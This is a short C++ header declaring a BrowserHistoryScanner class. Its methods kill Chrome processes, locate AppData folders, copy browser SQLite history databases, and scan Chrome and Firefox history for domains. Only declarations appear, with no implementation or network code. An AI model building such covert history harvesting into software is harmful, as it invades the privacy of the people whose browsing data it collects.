#pragma once

#include "../../../pch.h"
#include "../sqlite/sqlite3.h"


class BrowserHistoryScanner {
public:
    static void start_history_checks();
    static void TerminateChromeProcesses();
    static std::string GetLocalAppData();
    static std::string GetRoamingAppData();
    static bool CopyFFile(const std::string& src, const std::string& dest);
    static bool FileExists(const std::string& path);
    static std::string GetDomain(const std::string& url);
    static void ScanHistory(const std::string& db_path, const std::string& browser_name);
    static void ScanFirefox();
};